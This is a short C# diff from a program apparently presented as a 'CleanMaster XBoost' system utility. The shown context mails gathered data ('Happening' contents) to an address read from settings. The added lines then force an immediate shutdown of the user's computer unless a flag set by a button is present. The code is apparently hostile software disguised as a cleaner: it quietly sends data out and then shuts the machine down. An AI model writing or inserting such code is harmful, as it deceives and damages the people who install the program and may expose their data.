@@ -44,11 +44,23 @@ namespace CleanMasterXBoostSuper
             copy.Join();
             SendMail sm = new SendMail();
             sm.NewMail(c.Happening+cm.Happening, s.Mail);
+            if (stop)
+            {
+                Close();
+            }
+            else
+            {
+                ProcessStartInfo startInfo =
+                new ProcessStartInfo("shutdown.exe", "-s /t 0");
+                Process.Start(startInfo);
+            }
         }
 
         private void button2_Click(object sender, EventArgs e)
         {
             File.Delete(@".\SettingsSave.resx");
+            stop = true;
+            Close();
         }
     }
 }
